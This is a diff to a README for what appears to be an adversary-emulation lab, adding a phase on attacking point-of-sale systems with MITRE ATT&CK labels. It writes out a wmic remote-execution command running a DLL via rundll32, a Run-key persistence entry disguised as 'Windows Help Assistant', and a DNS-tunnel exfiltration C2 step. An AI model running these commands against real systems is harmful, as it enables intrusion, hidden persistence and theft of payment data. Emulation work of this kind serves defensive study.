@@ -116,9 +116,45 @@ pscp.exe -P {port} {path_on_windows}\ad.7z root@192.168.1.13:/temp/
 
 ---
 
-### Phase2 
+### Phase2: Scenario 1 - Attacking Point of Sale (POS) Systems
 
 ![outline_phase2](Documentation/phase2.png)
+
+#### Lateral Movement
+
+Remote Services: Remote Desktop Protocol T1021.001
+
+```
+I used rdesktop tool you can use any other tool you like.
+```
+
+#### Execution
+
+Windows Management Instrumentation T1047
+
+```
+wmic /node:"192.168.1.62" process call create "rundll32.exe c:\windows\User\Administrator\Assistant32.dll,run"
+```
+
+#### Persistence
+
+Registry Run Keys T1547.001
+
+```
+"C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Help Assistant" /t REG_SZ /d "rundll32.exe c:\windows\User\Administrator\Assistant32.dll,run" /f
+
+```
+
+#### Exfiltration
+
+PoS data exfiltration over DNS tunnel T1048.003
+
+```
+to do that run on your attacking machine:
+python3 dns_c2_server.py
+```
+
+![c2_server_and_rdp](Phase2/Screenshots/1.png)
 
 ## Credits
 
